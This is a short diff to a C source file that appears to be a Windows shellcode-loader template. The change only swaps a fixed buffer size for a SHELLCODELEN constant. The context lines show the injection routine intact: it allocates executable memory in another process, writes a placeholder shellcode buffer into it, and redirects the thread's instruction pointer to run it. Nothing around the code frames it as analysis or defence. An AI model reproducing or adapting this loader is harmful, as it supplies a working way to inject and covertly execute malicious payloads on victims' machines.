@@ -1,7 +1,7 @@
 #include <windows.h>
 
-#define SCSIZE 2048
-unsigned char code[SCSIZE] = 
+
+unsigned char code[SHELLCODELEN] = 
 "YOUR SHELLCODE";
 
 /* hand-rolled bzero allows us to avoid including ms vc runtime */
@@ -59,9 +59,9 @@ void ExecutePayload(void) {
 		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
 		GetThreadContext(pi.hThread, &ctx);
 
-	   ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	   ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SHELLCODELEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-        WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);
+        WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SHELLCODELEN, 0);
 
 	   ctx.Eip = (DWORD)ep;
 
